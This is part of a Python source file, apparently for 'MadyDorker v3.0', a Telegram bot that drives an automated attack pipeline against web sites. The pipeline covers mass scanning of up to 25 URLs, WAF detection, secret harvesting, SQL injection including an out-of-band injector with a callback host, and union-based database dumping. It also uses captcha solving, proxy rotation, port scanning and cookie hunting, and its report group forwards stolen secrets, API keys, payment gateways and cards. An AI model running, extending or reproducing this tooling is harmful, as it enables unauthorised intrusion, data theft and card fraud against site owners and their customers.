    
    Usage:
        /mass url1 url2 url3 ...
        /mass url1
              url2
              url3
    """
    if not context.args:
        await update.message.reply_text(
            "<b>Usage:</b> /mass url1 url2 url3 ...\n\n"
            "Scans up to 25 URLs in sequence through the full pipeline "
            "(WAF + Secrets + Crawl + FlareSolverr + SQLi + Dump).\n\n"
            "<i>Paste URLs separated by spaces or newlines.</i>",
            parse_mode="HTML"
        )
        return

    chat_id = update.effective_chat.id

    # Check if a scan is already running
    existing = scan_tasks.get(chat_id)
    if existing and not existing.done():
        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
        return

    # Normalize URLs
    raw_urls = context.args[:]
    urls = []
    for u in raw_urls:
        u = u.strip().rstrip(",").strip()
        if not u:
            continue
        if not u.startswith("http"):
            u = "https://" + u
        urls.append(u)

    if not urls:
        await update.message.reply_text("❌ No valid URLs provided.")
        return

    if len(urls) > 25:
        await update.message.reply_text(
            f"⚠️ Too many URLs ({len(urls)}). Max is <b>25</b>. Trimming to first 25.",
            parse_mode="HTML"
        )
        urls = urls[:25]

    # Deduplicate while preserving order
    seen = set()
    deduped = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            deduped.append(u)
    urls = deduped

    url_list_text = "\n".join(f"  {i+1}. <code>{u[:80]}</code>" for i, u in enumerate(urls))
    await update.message.reply_text(
        f"🚀 <b>Mass Scan Starting — {len(urls)} URLs</b>\n\n"
        f"{url_list_text}\n\n"
        f"Each URL goes through the full pipeline:\n"
        f"WAF → Secrets → Deep Crawl (+ FlareSolverr) → SQLi → Dump\n\n"
        f"Use /stopscan to cancel.",
        parse_mode="HTML"
    )

    async def _run_mass():
        completed = 0
        failed = 0
        findings_summary = []  # (url, summary_str)
        try:
            for idx, url in enumerate(urls, 1):
                # Check if cancelled
                if asyncio.current_task().cancelled():
                    raise asyncio.CancelledError()

                await update.message.reply_text(
                    f"\n{'━'*30}\n"
                    f"🔍 <b>[{idx}/{len(urls)}] Scanning:</b>\n"
                    f"<code>{url}</code>",
                    parse_mode="HTML"
                )

                try:
                    await _do_scan(update, url)
                    completed += 1
                    findings_summary.append((url, "✅"))
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    failed += 1
                    findings_summary.append((url, f"❌ {str(e)[:80]}"))
                    logger.error(f"[Mass] Scan failed for {url}: {e}")
                    await update.message.reply_text(
                        f"❌ Scan failed for <code>{url[:80]}</code>: {str(e)[:200]}",
                        parse_mode="HTML"
                    )

            # Final summary
            summary_lines = []
            for u, status in findings_summary:
                domain = urlparse(u).netloc or u[:40]
                summary_lines.append(f"  {status} {domain}")

            await update.message.reply_text(
                f"\n{'━'*30}\n"
                f"📊 <b>Mass Scan Complete</b>\n\n"
                f"Total: <b>{len(urls)}</b> | "
                f"Done: <b>{completed}</b> | "
                f"Failed: <b>{failed}</b>\n\n"
                + "\n".join(summary_lines),
                parse_mode="HTML"
            )
        except asyncio.CancelledError:
            await update.message.reply_text(
                f"🛑 Mass scan cancelled after {completed}/{len(urls)} URLs."
            )
        except Exception as e:
            logger.error(f"Mass scan error: {e}")
            await update.message.reply_text(f"❌ Mass scan error: {str(e)[:200]}")
        finally:
            scan_tasks.pop(chat_id, None)

    task = asyncio.create_task(_run_mass())
    scan_tasks[chat_id] = task


async def cmd_setgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setgroup — set this chat as the report group for all findings."""
    p = get_pipeline()
    chat_id = update.effective_chat.id
    chat = update.effective_chat

    if context.args and context.args[0].lower() == "off":
        p.set_report_group(None)
        p._report_chat_id = None
        await update.message.reply_text("📤 Report group disabled. Findings will only go to the dorking chat.")
        return

    p.set_report_group(chat_id)
    chat_title = chat.title or chat.first_name or str(chat_id)
    await update.message.reply_text(
        f"📤 <b>Report group set!</b>\n\n"
        f"Chat: <b>{chat_title}</b> ({chat_id})\n\n"
        f"All findings (SQLi, secrets, gateways, cards, API keys) "
        f"will be automatically forwarded here.\n\n"
        f"Hourly export summaries will also be posted.\n"
        f"Use <code>/setgroup off</code> to disable.",
        parse_mode="HTML"
    )


async def cmd_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /export — immediately generate and send an export .txt file."""
    p = get_pipeline()

    await update.message.reply_text("📁 Generating export...")

    filepath = await p._write_export()
    if not filepath:
        await update.message.reply_text("❌ Export failed — check logs.")
        return

    stats = p.get_stats()

    # Send as document
    try:
        with open(filepath, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(filepath),
                caption=(
                    f"📁 MadyDorker Export\n"
                    f"URLs: {stats['urls_scanned']} | "
                    f"SQLi: {stats['sqli_vulns']} | "
                    f"Secrets: {stats['secrets_found']} | "
                    f"Gateways: {stats['gateways_found']} | "
                    f"Cards: {stats['cards_found']}"
                ),
            )
    except Exception as e:
        await update.message.reply_text(
            f"📁 Export saved to:\n<code>{filepath}</code>\n\n"
            f"(Could not send as document: {str(e)[:100]})",
            parse_mode="HTML"
        )


async def cmd_firecrawl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show Firecrawl status and usage."""
    p = get_pipeline()
    
    if not p.config.firecrawl_enabled or not p.config.firecrawl_api_key:
        await update.message.reply_text("❌ Firecrawl is not configured. Set FIRECRAWL_API_KEY env var.")
        return
    
    fc_status = "✅ Enabled"
    mode = "Fallback only" if p.config.firecrawl_as_fallback else "Primary engine"
    scrape = "✅" if p.config.firecrawl_scrape_enabled else "❌"
    crawl = "✅" if p.config.firecrawl_crawl_enabled else "❌"
    
    # Get engine stats
    fc_stats = p.searcher.health.get_stats().get("firecrawl", {})
    
    text = (
        f"🔥 <b>Firecrawl Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: {fc_status}\n"
        f"Mode: {mode}\n"
        f"Search: ✅ | Scrape: {scrape} | Crawl: {crawl}\n"
        f"Search Limit: {p.config.firecrawl_search_limit} results/query\n"
        f"Crawl Limit: {p.config.firecrawl_crawl_limit} pages\n"
        f"Proxy Mode: {p.config.firecrawl_proxy_mode}\n\n"
        f"<b>Engine Stats:</b>\n"
        f"Searches: {fc_stats.get('success', 0)} ok / {fc_stats.get('fail', 0)} fail\n"
        f"Rate: {fc_stats.get('rate', 'N/A')}\n"
        f"Available: {'✅' if fc_stats.get('available', True) else '❌ cooled down'}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show captcha solver status, balances, and stats."""
    p = get_pipeline()

    if not p.captcha_solver or not p.captcha_solver.available:
        await update.message.reply_text(
            "🧩 <b>Captcha Solver</b>\n\n"
            "❌ Not configured. Set API keys in config:\n"
            "<code>TWOCAPTCHA_API_KEY</code>\n"
            "<code>NOPECHA_API_KEY</code>\n"
            "<code>ANTICAPTCHA_API_KEY</code>",
            parse_mode="HTML",
        )
        return

    stats = p.captcha_solver.get_stats()

    # Get balances (async)
    balances = await p.captcha_solver.get_balances()
    bal_lines = []
    for prov, bal in balances.items():
        if bal < 0:
            bal_lines.append(f"  {prov}: ⚠️ error")
        else:
            bal_lines.append(f"  {prov}: ${bal:.4f}")
    bal_text = "\n".join(bal_lines) if bal_lines else "  No providers"

    # Per-type breakdown
    type_lines = []
    for ctype, s in stats.get("by_type", {}).items():
        total = s["solved"] + s["failed"]
        rate = f"{s['solved']/total:.0%}" if total else "N/A"
        type_lines.append(f"  {ctype}: {s['solved']}✅ {s['failed']}❌ ({rate})")
    type_text = "\n".join(type_lines) if type_lines else "  No solves yet"

    # Per-provider breakdown
    prov_lines = []
    for prov, s in stats.get("by_provider", {}).items():
        total = s["solved"] + s["failed"]
        rate = f"{s['solved']/total:.0%}" if total else "N/A"
        prov_lines.append(f"  {prov}: {s['solved']}✅ {s['failed']}❌ ({rate})")
    prov_text = "\n".join(prov_lines) if prov_lines else "  No solves yet"

    text = (
        f"🧩 <b>Captcha Solver Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: ✅ Enabled\n"
        f"Providers: {', '.join(stats['providers'])}\n"
        f"Auto-solve search: {'✅' if stats['auto_solve_search'] else '❌'}\n"
        f"Auto-solve target: {'✅' if stats['auto_solve_target'] else '❌'}\n\n"
        f"<b>Balances:</b>\n{bal_text}\n\n"
        f"<b>Stats:</b>\n"
        f"  Attempts: {stats['total_attempts']}\n"
        f"  Solved: {stats['total_solved']}\n"
        f"  Failed: {stats['total_failed']}\n"
        f"  Rate: {stats['success_rate']}\n"
        f"  Cost: {stats['total_cost']}\n"
        f"  Avg time: {stats['avg_solve_time']}\n\n"
        f"<b>By Type:</b>\n{type_text}\n\n"
        f"<b>By Provider:</b>\n{prov_text}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /proxy command — show proxy pool status and stats."""
    p = get_pipeline()
    
    if not p.proxy_manager or not p.proxy_manager.has_proxies:
        await update.message.reply_text(
            "🔄 <b>Proxy Manager</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Status: ❌ Disabled (no proxies loaded)\n\n"
            "Configure proxy_files in config_v3.py and set use_proxies=True",
            parse_mode="HTML"
        )
        return
    
    stats = p.proxy_manager.get_stats()
    
    # Country breakdown (top 5)
    country_lines = []
    countries = p.proxy_manager.get_country_breakdown()
    for country, count in list(countries.items())[:5]:
        country_lines.append(f"  {country}: {count}")
    country_text = "\n".join(country_lines) if country_lines else "  Unknown"
    
    # Source breakdown
    source_lines = []
    for src, count in stats.by_source.items():
        source_lines.append(f"  {src}: {count}")
    source_text = "\n".join(source_lines) if source_lines else "  N/A"
    
    # Top proxies
    top_lines = []
    for addr, score in stats.top_proxies:
        top_lines.append(f"  {addr} (score: {score:.2f})")
    top_text = "\n".join(top_lines) if top_lines else "  No data yet"
    
    # Worst proxies
    worst_lines = []
    for addr, fails in stats.worst_proxies:
        worst_lines.append(f"  {addr} ({fails} fails)")
    worst_text = "\n".join(worst_lines) if worst_lines else "  None"
    
    # Success rate
    total_reqs = stats.total_successes + stats.total_failures
    success_pct = f"{stats.total_successes / total_reqs:.0%}" if total_reqs else "N/A"
    
    text = (
        f"🔄 <b>Proxy Pool Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: ✅ Enabled\n"
        f"Strategy: {p.proxy_manager.pool.strategy.value}\n"
        f"Total: {stats.total_proxies}\n"
        f"Alive: {stats.alive_proxies}\n"
        f"Banned: {stats.banned_proxies}\n"
        f"Dead: {stats.dead_proxies}\n\n"
        f"<b>Requests:</b>\n"
        f"  Total: {total_reqs}\n"
        f"  Success: {stats.total_successes}\n"
        f"  Failed: {stats.total_failures}\n"
        f"  Rate: {success_pct}\n"
        f"  Avg latency: {stats.avg_latency_ms:.0f}ms\n\n"
        f"<b>Countries:</b>\n{country_text}\n\n"
        f"<b>Sources:</b>\n{source_text}\n\n"
        f"<b>Top Proxies:</b>\n{top_text}\n\n"
        f"<b>Worst Proxies:</b>\n{worst_text}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /browser command — show headless browser engine stats."""
    p = get_pipeline()
    
    if not p.browser_manager:
        pw_status = "✅ Installed" if _HAS_PLAYWRIGHT else "❌ Not installed"
        await update.message.reply_text(
            f"🌐 <b>Headless Browser Engine</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Status: ❌ Disabled\n"
            f"Playwright: {pw_status}\n\n"
            f"Set browser_enabled=True in config.\n"
            f"Install: <code>pip install playwright && playwright install chromium</code>",
            parse_mode="HTML"
        )
        return
    
    stats = p.browser_manager.get_stats()
    
    text = (
        f"🌐 <b>Headless Browser Engine</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: {'✅ Running' if stats['running'] else '⏳ Idle (starts on demand)'}\n"
        f"Playwright: {'✅ Available' if stats['available'] else '❌ Missing'}\n"
        f"Headless: {p.config.browser_headless}\n"
        f"Max concurrent tabs: {p.config.browser_max_concurrent}\n"
        f"Fallback engines: {', '.join(p.config.browser_engines)}\n\n"
        f"<b>Stats:</b>\n"
        f"  Searches: {stats['searches']}\n"
        f"  Total results: {stats['total_results']}\n"
        f"  Avg results/search: {stats['avg_results']:.1f}\n"
        f"  Errors: {stats['errors']}\n"
        f"  Captchas hit: {stats['captchas_hit']}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_ecom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ecom command — show e-commerce checker stats."""
    p = get_pipeline()
    if not p.ecom_checker:
        await update.message.reply_text("❌ E-commerce checker is not enabled. Set ecom_checker_enabled=True in config.")
        return
    text = p.ecom_checker.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_crawlstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /crawlstats command — show recursive crawler stats."""
    p = get_pipeline()
    if not p.crawler:
        await update.message.reply_text(
            "❌ Recursive crawler is not enabled.\n"
            "Set <code>deep_crawl_enabled=True</code> in config.",
            parse_mode="HTML",
        )
        return
    text = p.crawler.get_stats_text()
    text += (
        f"\n\n<b>Config:</b>\n"
        f"  Max depth: {p.config.deep_crawl_max_depth}\n"
        f"  Max pages: {p.config.deep_crawl_max_pages}\n"
        f"  Concurrent: {getattr(p.config, 'deep_crawl_concurrent', 10)}\n"
        f"  Timeout: {p.config.deep_crawl_timeout}s\n"
        f"  Delay: {getattr(p.config, 'deep_crawl_delay', 0.1)}s\n"
        f"  Robots.txt: {getattr(p.config, 'deep_crawl_robots', False)}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ports command — show port scanner stats."""
    p = get_pipeline()
    if not p.port_scanner:
        await update.message.reply_text("❌ Port scanner is not enabled. Set port_scan_enabled=True in config.")
        return
    text = p.port_scanner.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_oob(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /oob command — show OOB SQLi injector stats."""
    p = get_pipeline()
    if not p.oob_injector:
        await update.message.reply_text(
            "❌ OOB SQLi injector is not enabled.\n"
            "Set <code>oob_sqli_enabled=True</code> and configure callback host in config.",
            parse_mode="HTML",
        )
        return
    text = p.oob_injector.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_unionstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /unionstats command — show multi-DBMS union dumper stats."""
    p = get_pipeline()
    if not p.union_dumper:
        await update.message.reply_text("❌ Multi-DBMS union dumper is not enabled. Set union_dump_enabled=True in config.")
        return
    text = p.union_dumper.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /keys command — show API key validator stats."""
    p = get_pipeline()
    if not p.key_validator:
        await update.message.reply_text("❌ API key validator is not enabled. Set key_validation_enabled=True in config.")
        return
    text = p.key_validator.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_mlfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mlfilter command — show ML false positive filter stats."""
    p = get_pipeline()
    if not p.ml_filter:
        await update.message.reply_text("❌ ML filter is not enabled. Set ml_filter_enabled=True in config.")
        return
    text = p.ml_filter.get_stats_text()
    await update.message.reply_text(text, parse_mode="HTML")


# ==================== ENTRY POINT ====================

def main():
    """Main entry point."""
    config = DorkerConfig()
    
    if not config.telegram_bot_token:
        logger.error("No bot token configured! Set DORKER_BOT_TOKEN or update config_v3.py")
        sys.exit(1)
    
    if not HAS_PTB:
        logger.warning("python-telegram-bot not installed, running pipeline without bot interface")
        # Run pipeline directly
        global pipeline
        pipeline = MadyDorkerPipeline(config)
        asyncio.run(pipeline.start())
        return
    
    logger.info("Starting MadyDorker v3.0 Telegram Bot...")
    
    app = Application.builder().token(config.telegram_bot_token).build()
    
    # Register handlers (work in both DM and group chats)
    chat_filter = filters.ChatType.PRIVATE | filters.ChatType.GROUP | filters.ChatType.SUPERGROUP
    
    app.add_handler(CommandHandler("start", cmd_start, filters=chat_filter))
    app.add_handler(CommandHandler("help", cmd_start, filters=chat_filter))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern=r"^menu_"))
    app.add_handler(CommandHandler("dorkon", cmd_dorkon, filters=chat_filter))
    app.add_handler(CommandHandler("dorkoff", cmd_dorkoff, filters=chat_filter))
    app.add_handler(CommandHandler("stopscan", cmd_stopscan, filters=chat_filter))
    app.add_handler(CommandHandler("status", cmd_status, filters=chat_filter))
    app.add_handler(CommandHandler("dorkstats", cmd_dorkstats, filters=chat_filter))
    app.add_handler(CommandHandler("sqlistats", cmd_sqlistats, filters=chat_filter))
    app.add_handler(CommandHandler("secrets", cmd_secrets, filters=chat_filter))
    app.add_handler(CommandHandler("dumps", cmd_dumps, filters=chat_filter))
    app.add_handler(CommandHandler("categories", cmd_categories, filters=chat_filter))
    app.add_handler(CommandHandler("target", cmd_target, filters=chat_filter))
    app.add_handler(CommandHandler("scan", cmd_scan, filters=chat_filter))
    app.add_handler(CommandHandler("deepscan", cmd_deepscan, filters=chat_filter))
    app.add_handler(CommandHandler("mass", cmd_mass, filters=chat_filter))
    app.add_handler(CommandHandler("authscan", cmd_authscan, filters=chat_filter))
    app.add_handler(CommandHandler("setgroup", cmd_setgroup, filters=chat_filter))
    app.add_handler(CommandHandler("export", cmd_export, filters=chat_filter))
    app.add_handler(CommandHandler("cookies", cmd_cookies, filters=chat_filter))
    app.add_handler(CommandHandler("cookiehunt", cmd_cookiehunt, filters=chat_filter))
    app.add_handler(CommandHandler("firecrawl", cmd_firecrawl, filters=chat_filter))
    app.add_handler(CommandHandler("captcha", cmd_captcha, filters=chat_filter))
    app.add_handler(CommandHandler("proxy", cmd_proxy, filters=chat_filter))
    app.add_handler(CommandHandler("browser", cmd_browser, filters=chat_filter))
    app.add_handler(CommandHandler("ecom", cmd_ecom, filters=chat_filter))
    app.add_handler(CommandHandler("crawlstats", cmd_crawlstats, filters=chat_filter))
    app.add_handler(CommandHandler("ports", cmd_ports, filters=chat_filter))
    app.add_handler(CommandHandler("oob", cmd_oob, filters=chat_filter))
    app.add_handler(CommandHandler("unionstats", cmd_unionstats, filters=chat_filter))
    app.add_handler(CommandHandler("keys", cmd_keys, filters=chat_filter))
    app.add_handler(CommandHandler("mlfilter", cmd_mlfilter, filters=chat_filter))
    
    logger.info("Bot handlers registered, starting polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
